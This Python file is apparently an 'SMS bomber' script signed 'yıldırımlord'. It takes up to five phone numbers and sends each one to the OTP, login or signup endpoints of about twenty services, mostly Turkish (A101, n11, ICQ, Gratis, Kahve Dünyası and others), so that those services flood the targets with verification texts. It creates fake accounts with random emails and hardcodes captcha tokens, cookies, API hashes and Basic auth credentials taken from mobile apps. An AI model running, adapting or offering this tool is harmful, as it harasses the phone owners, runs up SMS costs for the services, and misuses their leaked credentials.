import requests

from random import choice

from string import ascii_lowercase

from bs4 import BeautifulSoup

from colorama import Fore, Style

from time import sleep



class SendSms():

    adet = 0

    toplam_sms = 1

    
    
#yıldırımlord#4444 | made by yıldırımlord

    def __init__(self, phone, phone2, phone3, phone4, phone5, mail):

        self.phone = str(phone)

        self.phone2 = str(phone2)

        self.phone3 = str(phone3)

        self.phone4 = str(phone4)

        self.phone5 = str(phone5)

        if len(mail) != 0:

            self.mail = mail

        else:

            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"

            

    

    





    # dsmartgo.com.tr

    def Dsmartgo(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={

        	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",

        	        "IsSubscriber": "true",

        	        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",

        	        "Mobile": numara,

                }, cookies={

        		    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",

        		    "_ga": "GA1.3.1016548678.1638216163",

        		    "_gat": "1",

        		    "_gat_gtag_UA_18913632_14": "1",

        		    "_gid": "GA1.3.1214889554.1638216163",

        		    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",

        		    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"

        	    })

            try:

                BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()

                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")

            except AttributeError:

                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                self.adet += 1

                self.toplam_sms += 1

            uygulanan_nolar += 1

            if uygulanan_nolar == bos_olmayan:

                break

            else:

                continue

        






    #kahvedunyasi.com

    def KahveDunyasi(self):    

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={

                    "mobile_number": numara,

                    "token_type": "register_token"

                })

                    if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> core.kahvedunyasi.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise 

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> core.kahvedunyasi.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

        




        

    #wmf.com.tr

    def Wmf(self):        

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    wmf = requests.post("https://www.wmf.com.tr/users/register/", data={

                    "confirm": "true",

                    "date_of_birth": "1956-03-01",

                    "email": self.mail,

                    "email_allowed": "true",

                    "first_name": "Memati",

                    "gender": "male",

                    "last_name": "Bas",

                    "password": "31ABC..abc31",

                    "phone": f"0{numara}"

                })

                    if wmf.status_code == 202:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> wmf.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                       raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> wmf.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

                else:

                    continue

         

    


    #bim

    def Bim(self):         

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": numara})

                    if bim.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.veesk.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.veesk.net "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

        


    #a101.com.tr

    def A101(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://www.a101.com.tr:443/users/otp-login/"

                    data = {"phone": f"0{numara}", "next": "/a101-kapida"}

                    r = requests.post(url,data=data)

                    if (r.status_code) == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    #englishhome.com

    def Englishhome(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{numara}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}

                    home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)

                    if home.status_code == 202:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

            
    #rentiva.com

    def Rentiva(self): 

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://rentiva.com:443/api/Account/Login"

                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}

                    json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": numara, "type": 1}

                    rentiva = requests.post(url, headers=headers, json=json)

                    if rentiva.json()["success"] == True:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rentiva.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    



    #loncamarket.com

    def Lonca(self):



        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}

                    json={"Address": numara, "ConfirmationType": 0}

                    lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)

                    if lonca.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> loncamarket.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> loncamarket.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue  

            

    

    #dgnonline.com

    def Dgn(self):          

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"

                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}

                    data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": numara}

                    dgn = requests.post(url, headers=headers, data=data)

                    if dgn.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> odeme.dgnonline.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> odeme.dgnonline.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    

    #mopas.com.tr

    def Mopas(self):          

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={numara}&pwd=&checkPwd=")

                    if r.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mopas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mopas.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    

    #icq.net

    def Icq(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"

                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}

                    json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{numara}", "route": "sms"}, "reqId": "25299-1669396271"}

                    r = requests.post(url, headers=headers, json=json)

                    if r.json()["status"]["code"] == 20000:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> u.icq.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> u.icq.net "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    




    #idealdata.com.tr

    def Osmanlideal(self):





        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{numara}")

                    if r.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> osmgck.idealdata.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> osmgck.idealdata.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            



    #suiste.com

    def Suiste(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://suiste.com:443/api/auth/code"

                    headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}

                    data = {"action": "register", "gsm": numara}

                    r = requests.post(url, headers=headers, data=data)

                    if r.json()["code"] == "common.success":

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> suiste.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> suiste.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

            

    #hayatsu.com.tr

    def Hayat(self):



        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"

                    json={"mobilePhoneNumber": numara}

                    r = requests.post(url, json=json)

                    if (r.json()["IsSuccessful"]) == True:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> hayatsu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hayatsu.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

            


    #KimGbIster

    def KimGb(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{numara}"})

                    if r.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue





#yıldırımlord#4444 | made by yıldırımlord

    #tazi.tech

    def Tazi(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"

                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}

                    json={"cep_tel": numara, "cep_tel_ulkekod": "90"}

                    r = requests.post(url, headers=headers, json=json)

                    if (r.json()["kod"]) == "0000":

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapiv2.tazi.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapiv2.tazi.tech "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    


    #n11.com

    def N11(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"

                    headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}

                    json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": numara, "userType": "BUYER"}

                    r = requests.post(url, headers=headers, json=json)

                    if (r.json()["isSuccess"]) == True:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.n11.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.n11.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    


    #gofody.com

    def Gofody(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://backend.gofody.com:443/api/v1/enduser/register/"

                    json={"country_code": "90", "phone": numara}

                    r = requests.post(url, json=json)

                    if (r.json()["success"]) == True:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> backend.gofody.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> backend.gofody.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue






    #gratis.com

    def Gratis(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]

                    url = "https://ivt.mobildev.com:443/data/0e80tyg8"

                    headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}

                    json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": numara, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}

                    r = requests.post(url, headers=headers, json=json)

                    if (r.status_code) == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ivt.mobildev.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ivt.mobildev.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

